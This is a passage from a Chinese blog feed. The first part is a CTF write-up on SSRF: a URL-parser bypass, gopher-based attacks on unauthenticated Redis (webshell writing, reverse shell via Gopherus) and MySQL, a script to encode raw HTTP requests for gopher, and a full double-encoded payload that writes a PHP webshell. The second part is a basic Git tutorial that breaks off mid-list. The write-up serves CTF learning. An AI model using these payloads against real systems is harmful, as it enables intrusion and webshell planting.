class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>可以看到 check_inner_ip 通过 url_parse 检测是否为内网 ip，如果满足不是内网 ip ，通过 curl 请求 url 返回结果，这题就可以利用 curl 和 parse_url 解析的差异不同来绕过，让 parse_url 处理外部网站，最后 curl 请求内网网址。</p><p>最后的 payload 为</p><p><code>http://ip/challenge.php?url=http://@127.0.0.1:80%20@www.baidu.com/flag.php</code></p><p>有关 URL 的解析问题更加详细可参考：</p><p><a class="link" href="https://blog.csdn.net/qq_38154820/article/details/109252839">https://blog.csdn.net/qq_38154820/article/details/109252839 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="gopher攻击redis"><a class="markdownIt-Anchor" href="#gopher攻击redis">#</a> Gopher 攻击 Redis</h3><h4 id="redis的协议数据流格式"><a class="markdownIt-Anchor" href="#redis的协议数据流格式">#</a> redis 的协议数据流格式</h4><p>数据流格式中 CR LF 表示的就是 \r \n</p><blockquote><p>*&lt;参数数量&gt; CR LF<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mtext>参数</mtext><mn>1</mn><mtext>的字节数量</mtext><mo>&gt;</mo><mi>C</mi><mi>R</mi><mi>L</mi><mi>F</mi><mo>&lt;</mo><mtext>参数</mtext><mn>1</mn><mtext>的数据</mtext><mo>&gt;</mo><mi>C</mi><mi>R</mi><mi>L</mi><mi>F</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">&lt;参数 1 的字节数量&gt; CR LF&lt;参数 1 的数据&gt; CR LF...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord">1</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">节</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">量</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord">1</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">据</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span>&lt;参数 N 的字节数量&gt; CR LF<br> &lt;参数 N 的数据&gt; CR LF<br> 简单示例：</p></blockquote><p>*4：表示 4 个参数 config、set、dir、/var/www/html<br>$6：表示每个参数的字节长度 config 长度为 6</p><blockquote><p>*4<br>$6<br>config<br>$3<br>set<br>$3<br>dir<br>$13<br>/var/www/html</p></blockquote><p>Redis 一般都是绑定在 6379 端口，如果没有设置口令（默认是无），攻击者就可以通过 SSRF 漏洞未授权访问内网 Redis，一般用来写入 Crontab 定时任务用来反弹 shell，或者写入 webshell 等等。</p><p>在 CTF 题目中如果找到了内网的服务开了 6379 端口，一般来说就是 Redis 未授权访问漏洞，并且没有 ban 掉 gopher://，可以用网上的脚本一把梭，比如：Gopherus</p><h4 id="写入shell"><a class="markdownIt-Anchor" href="#写入shell">#</a> 写入 shell</h4><p><code>python2 gopherus.py --exploit redis</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/23/N2EnplomH1vFh8I.png" alt="image.png"></p><p>在有 SSRF 漏洞的地方输入生成的 payload— 即 gopher://127.0.0.1:6379 后面一大段，接下来会在目录下生成 shell.php。</p><p>要注意的是如果是在 html 的输入框中直接输入提交就行，但要在浏览器的 URL 输入的话，一定要记得 URL 编码一次。</p><h4 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell">#</a> 反弹 shell</h4><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/23/wsnqCkpzOIoucZr.png" alt="image.png"></p><p>要配合 nc 监听</p><h3 id="攻击mysql"><a class="markdownIt-Anchor" href="#攻击mysql">#</a> 攻击 Mysql</h3><p>攻击内网 mysql 的条件：内网开启了 3306 端口，mysql 无密码</p><p>上面的题目复现就用到了这个</p><h3 id="gopher发送请求"><a class="markdownIt-Anchor" href="#gopher发送请求">#</a> Gopher 发送请求</h3><p>SSRF 漏洞是服务端请求伪造攻击，不论是 GET 或者是 POST 方法，都是为了达到一个目的，就是让服务端帮我们来执行请求。</p><p>那么在 CTF 中什么情况需要利用到这种方法呢，比如发现了一个内网的应用有上传的功能，我们需要通过 POST 提交数据，而且 Gopher 协议没有被 ban，我们就可以考虑构造一个请求去打内网，下面先从本地看看如何构造：</p><p>通常，我们可以利用 gopher:// 协议可以用来发送 Get 和 Post 请求，需要注意的点是要对发送的请求头中的空格和一些特殊字符进行 url 编码，如果是在 URL 中提交 payload 的时侯要再进行一次 url 编码，先来看看如何发送简单的请求。</p><ul><li>POST 请求</li></ul><p>在 phpstudy 写入 1.php</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure></div><p>burpsuite 抓包获取请求头，POST 包的请求头有很多行，我们用的时候不用全部带上，但是要记得加上 Content-Type 和 Content-Length，也可以全部带上</p><blockquote><p>POST /1.php HTTP/1.1<br>Host: 192.168.0.102<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 7</p><p>a=world</p></blockquote><p>然后需要对空格和一些特殊字符进行 url 编码，注意把其中的换行的地方加上 %0D%0A，当然手动加肯定是太麻烦了，这里给出一个脚本。</p><p>一键编码脚本：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">test =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /1.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.0.102</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 7</span></span><br><span class="line"><span class="string">a=world</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div><p>在里面加上你的请求体运行，然后我们在输出结果前面手动加上 gopher 协议头和 IP: 端口，最终为：</p><p><code>gopher://192.168.0.102:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.0.102%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%207%0D%0A%0D%0Aa%3Dworld%0D%0A</code></p><p>然后用 curl 命令发出我们的请求，可以看到成功获取响应包了。</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/23/lV8z5cASXZLnbNh.png" alt="image.png"></p><p>需要注意的是，如果要在 url 传入的话需要将发送的 POST 后面一大串再 url 编码一次</p><ul><li>GET 请求：</li></ul><p>GET 请求发送和 POST 请求基本一样</p><p>相关例题：2020 强网杯 half_infiltration</p><p>通过前面一系列操作获得 ssrf.php</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;we_have_done_ssrf_here_could_you_help_to_continue_it&#x27;</span>] ?? <span class="literal">false</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|var|apache|conf|proc|log/i&quot;</span> ,<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$url</span>)</span><br><span class="line">    &#123; </span><br><span class="line">            <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line">     &#125; </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></div><p>跑端口 40000 跑出来个登录框，然后有上传功能，参数 file 和 content 是上传文件</p><p>于是用 gopher 协议发送一个 POST 请求写马，payload 如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:40000/_POST /index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cookie: PHPSESSID=bv2afbkkbbpgkio8tjmai40ob7</span><br><span class="line">Content-Length: 174</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">file=php://filter/%2577rite=string.rot13|convert.Base64-decode|convert.iconv.utf-7.utf-8/resource=1.php&amp;content=K0FEdz9waHAgZXZhbCgrQUNRQVh3LUdFVCtBRnMtMCtBRjApK0FEcz8rQUQ0LQ</span><br></pre></td></tr></table></figure></div><p>最后 payload 如下，传入参数需要注意二次 url 编码：</p><p><code>http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%2520/index.php%2520HTTP/1.1%250AHost%253A%2520127.0.0.1%250ACookie%253A%2520PHPSESSID%253Dbv2afbkkbbpgkio8tjmai40ob7%250AContent-Length%253A%2520174%250AContent-Type%253A%2520application/x-www-form-urlencoded%250AConnection%253A%2520close%250d%250A%250Afile%253Dphp%253A//filter/%25252577rite%253Dstring.rot13%257Cconvert.Base64-decode%257Cconvert.iconv.utf-7.utf-8/resource%253D1.php%2526content%253DK0FEdz9waHAgZXZhbCgrQUNRQVh3LUdFVCtBRnMtMCtBRjApK0FEcz8rQUQ0LQ</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ssrf&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ssrf&quot;&gt;#&lt;/a&gt; SSRF&lt;/h1&gt;
&lt;h2 id=&quot;dasctf-x-gfctf-2024-easysignin&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Git&amp;Docker</title>
    <link href="http://example.com/2024/04/16/Git-Docker/"/>
    <id>http://example.com/2024/04/16/Git-Docker/</id>
    <published>2024-04-16T01:58:59.000Z</published>
    <updated>2024-04-17T04:30:39.200Z</updated>
    
    <content type="html"><![CDATA[<h1 id="git"><a class="markdownIt-Anchor" href="#git">#</a> Git</h1><h2 id="版本控制"><a class="markdownIt-Anchor" href="#版本控制">#</a> 版本控制</h2><h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍">#</a> 介绍</h3><h4 id="1什么是版本控制"><a class="markdownIt-Anchor" href="#1什么是版本控制">#</a> 1. 什么是版本控制</h4><p>​版本控制（Revision control）是一种在开发的过程中用于管理我们对文件、目录或工程等内容的修改历史，方便查看更改历史记录，备份以便恢复以前的版本的软件工程技术。简单来说就是用于管理多人协同开发项目的技术。 <strong>版本迭代</strong></p><h4 id="2为什么要有版本控制"><a class="markdownIt-Anchor" href="#2为什么要有版本控制">#</a> 2. 为什么要有版本控制？</h4><p>​    没有进行版本控制或者版本控制本身缺乏正确的流程管理，在软件开发过程中将会引入很多问题，如软件代码的一致性、软件内容的冗余、软件过程的事物性、软件开发过程中的并发性、软件源代码的安全性，以及软件的整合等问题。无论是工作还是学习，或者是自己做笔记，都经历过这样一个阶段！我们就迫切需要一个版本控制工具。（多人开发就必须要使用版本控制）<br>​    使用版本控制之后可以给你带来的一些便利：</p><blockquote><p>● 实现跨区域多人协同开发<br>● 追踪和记载一个或者多个文件的历史记录<br>● 组织和保护你的源代码和文档<br>● 统计工作量<br>● 并行开发、提高开发效率<br>● 跟踪记录整个软件的开发过程<br>● 减轻开发人员的负担，节省时间，同时降低人为错误</p></blockquote><h4 id="3常见版本控制工具"><a class="markdownIt-Anchor" href="#3常见版本控制工具">#</a> 3. 常见版本控制工具</h4><p>主流的版本控制器有如下这些：</p><blockquote><p>● <strong>Git</strong><br>● SVN（Subversion）<br>● CVS（Concurrent Versions System）<br>● VSS（Micorosoft Visual SourceSafe）<br>● TFS（Team Foundation Server）<br>● Visual Studio Online</p></blockquote><p>版本控制产品非常的多（Perforce、Rational ClearCase、RCS（GNU Revision Control System）、Serena Dimention、SVK、BitKeeper、Monotone、Bazaar、Mercurial、SourceGear Vault），现在影响力最大且使用最广泛的是 Git 与 SVN</p><h3 id="分类"><a class="markdownIt-Anchor" href="#分类">#</a> 分类</h3><h4 id="1本地版本控制"><a class="markdownIt-Anchor" href="#1本地版本控制">#</a> 1. 本地版本控制</h4><p>记录文件每次的更新，可以对每个版本做一个快照，或是记录补丁文件，适合个人用，如 RCS。</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/7OWankz9bgmRxvZ.png" alt="image.png"></p><h4 id="2集中式版本控制-svn"><a class="markdownIt-Anchor" href="#2集中式版本控制-svn">#</a> 2. 集中式版本控制 （SVN）</h4><p>所有的版本数据都保存在服务器上，协同开发者从服务器上同步更新或上传自己的修改。</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/EvP4MYdpjqthKH1.png" alt="image.png"></p><p>所有的版本数据都存在服务器上，用户的本地只有自己以前所同步的版本，如果不连网的话，用户就看不到历史版本，也无法切换版本验证问题，或在不同分支工作。而且，所有数据都保存在单一的服务器上，有很大的风险这个服务器会损坏，这样就会丢失所有的数据，当然可以定期备份。代表产品：SVN、CVS、VSS。</p><h4 id="3分布式版本控制-git"><a class="markdownIt-Anchor" href="#3分布式版本控制-git">#</a> 3. 分布式版本控制 （Git）</h4><p>每个人都有全部代码，所以有一定风险</p><p>所有版本信息仓库全部同步到本地的每个用户，这样就可以在本地查看所有版本历史，可以离线在本地提交，只需在连网时 push 到相应的服务器或其他用户那里。由于每个用户那里保存的都是所有的版本数据，只要有一个用户的设备没有问题就可以恢复所有的数据，但这增加了本地存储空间的占用。</p><p>不会因为服务器损坏或者网络问题造成不能工作的情况</p><h3 id="git和svn的区别"><a class="markdownIt-Anchor" href="#git和svn的区别">#</a> Git 和 SVN 的区别</h3><p>​SVN 是<strong>集中式版本控制系统</strong>，版本库是集中放在<strong>中央服务器</strong>的，而工作的时候，用的都是自己的电脑，所以首先要从中央服务器得到最新的版本，然后工作，完成工作后，需要把自己做完的活推送到中央服务器。集中式版本控制系统是<strong>必须联网</strong>才能工作，对网络带宽要求较高。<br>​       Git 是<strong>分布式版本控制系统</strong>，<strong>没有中央服务器</strong>，每个人的电脑就是一个完整的版本库，工作的时候<strong>不需要联网</strong>了，因为版本都在自己电脑上。协同的方法是这样的：比如说自己在电脑上改了文件 A，其他人也在电脑上改了文件 A，这时，你们两之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。Git 可以直接看到更新了哪些代码和文件！</p><p><strong>Git 是目前世界上最先进的分布式版本控制系统。</strong></p><h2 id="git理论"><a class="markdownIt-Anchor" href="#git理论">#</a> Git 理论</h2><h3 id="工作区域"><a class="markdownIt-Anchor" href="#工作区域">#</a> 工作区域</h3><blockquote><ul><li>** 工作区（workspace）：** 就是你在电脑里能看到的目录。</li><li>** 暂存区（index）：** 英文叫 stage 或 index。一般存放在 <strong>.git</strong> 目录下的 index 文件（.git/index）中，所以我们把暂存区有时也叫作索引（index）。</li><li>** 版本库（Repository）：** 工作区有一个隐藏目录 <strong>.git</strong>，这个不算工作区，而是 Git 的版本库。</li><li><strong>远程 Git 仓库（Remote)</strong></li></ul></blockquote><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/4wdCj32AFk1QaiZ.png" alt="image.png"></p><h3 id="工作流程"><a class="markdownIt-Anchor" href="#工作流程">#</a> 工作流程</h3><blockquote><p>1. 在本地目录添加、修改文件</p><p>2. 将需要进行版本管理的文件添加至暂存区  //git add .</p><p>3. 将暂存区文件提交到 Git 仓库  //git commit</p><p>4. 将本地仓库文件提交到远程仓库  //git push</p></blockquote><p>git 管理的文件有三种状态：已修改（modified）、已暂存（staged）、已提交（committed）</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/tga7QNjrkfeCIOn.png" alt="image.png"></p><h4 id="本地项目搭建"><a class="markdownIt-Anchor" href="#本地项目搭建">#</a> 本地项目搭建</h4><p>1. 创建一个全新仓库</p><p>初始化：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure></div><p>2. 克隆远程仓库</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone [url] //https://github.com/Fc04dB/Fc04dB.github.io/tree/main/2024/04</span><br></pre></td></tr></table></figure></div><h3 id="git文件操作"><a class="markdownIt-Anchor" href="#git文件操作">#</a> Git 文件操作</h3><h4 id="文件状态"><a class="markdownIt-Anchor" href="#文件状态">#</a> 文件状态</h4><p>版本控制就是对文件的版本控制，要对文件进行修改、提交等操作，首先要知道文件当前在什么状态，不然可能会提交了现在还不想提交的文件，或者要提交的文件没提交上。</p><ul><li>Untracked: 未跟踪，此文件在文件夹中，但并没有加入到 git 库，不参与版本控制。通过 git add 状态变为 Staged.</li><li>Unmodify: 文件已经入库，未修改，即版本库中的文件快照内容与文件夹中完全一致。这种类型的文件有两种去处，如果它被修改，而变为 Modified. 如果使用 git rm 移出版本库，则成为 Untracked 文件</li><li>Modified: 文件已修改，仅仅是修改，并没有进行其他的操作。这个文件也有两个去处，通过 git add 可进入暂存 staged 状态，使用 git checkout 则丢弃修改过，返回到 unmodify 状态，这个 git checkout 即从库中取出文件，覆盖当前修改！</li><li>Staged: 暂存状态。执行 git commit 则将修改同步到库中，这时库中的文件和本地文件又变为一致，文件为 Unmodify 状态。执行 git reset HEAD filename 取消暂存，文件状态为 Modified</li></ul><h4 id="查看文件状态"><a class="markdownIt-Anchor" href="#查看文件状态">#</a> 查看文件状态</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看指定文件状态</span><br><span class="line">git status [filename]</span><br><span class="line"></span><br><span class="line">#查看所有文件状态</span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"># git add .                  添加所有文件到暂存区</span><br><span class="line"># git commit -m &quot;消息内容&quot;    提交暂存区中的内容到本地仓库 -m 提交信息</span><br></pre></td></tr></table></figure></div><h4 id="忽略文件"><a class="markdownIt-Anchor" href="#忽略文件">#</a> 忽略文件</h4><p>有些时候我们不想把某些文件纳入版本控制中，比如数据库文件，临时文件，设计文件等</p><p>在主目录下建立 &quot;.gitignore&quot; 文件，此文件有如下规则：</p><ol><li>忽略文件中的空行或以井号（#）开始的行将会被忽略。</li><li>可以使用 Linux 通配符。例如：星号（*）代表任意多个字符，问号（？）代表一个字符，方括号（[abc]）代表可选字符范围，大括号（{string1,string2,…}）代表可选的字符串等。</li><li>如果名称的最前面有一个感叹号（!），表示例外规则，将不被忽略。</li><li>如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在此目录下，而子目录中的文件不忽略。</li><li>如果名称的最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件（默认文件或目录都忽略）。</li></ol><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#为注释</span><br><span class="line">*.txt        #忽略所有 .txt结尾的文件,这样的话上传就不会被选中！</span><br><span class="line">!lib.txt     #但lib.txt除外</span><br><span class="line">/temp        #仅忽略项目根目录下的TODO文件,不包括其它目录temp</span><br><span class="line">build/       #忽略build/目录下的所有文件</span><br><span class="line">doc/*.txt    #会忽略 doc/notes.txt 但不包括 doc/server/arch.txt</span><br></pre></td></tr></table></figure></div><h2 id="git命令"><a class="markdownIt-Anchor" href="#git命令">#</a> Git 命令</h2><p>仓库：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 在当前目录新建一个Git代码库</span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line"># 新建一个目录，将其初始化为Git代码库</span><br><span class="line">$ git init [project-name]</span><br><span class="line"></span><br><span class="line"># 下载一个项目和它的整个代码历史</span><br><span class="line">$ git clone [url]</span><br></pre></td></tr></table></figure></div><p>配置：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 显示当前的Git配置</span><br><span class="line">$ git config --list</span><br><span class="line"></span><br><span class="line"># 编辑Git配置文件</span><br><span class="line">$ git config -e [--global]</span><br><span class="line"></span><br><span class="line"># 设置提交代码时的用户信息</span><br><span class="line">$ git config [--global] user.name &quot;[name]&quot;</span><br><span class="line">$ git config [--global] user.email &quot;[email address]&quot;</span><br></pre></td></tr></table></figure></div><p>增加 / 删除文件：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 添加指定文件到暂存区</span><br><span class="line">$ git add [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"># 添加指定目录到暂存区，包括子目录</span><br><span class="line">$ git add [dir]</span><br><span class="line"></span><br><span class="line"># 添加当前目录的所有文件到暂存区</span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line"># 添加每个变化前，都会要求确认</span><br><span class="line"># 对于同一个文件的多处变化，可以实现分次提交</span><br><span class="line">$ git add -p</span><br><span class="line"></span><br><span class="line"># 删除工作区文件，并且将这次删除放入暂存区</span><br><span class="line">$ git rm [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"># 停止追踪指定文件，但该文件会保留在工作区</span><br><span class="line">$ git rm --cached [file]</span><br><span 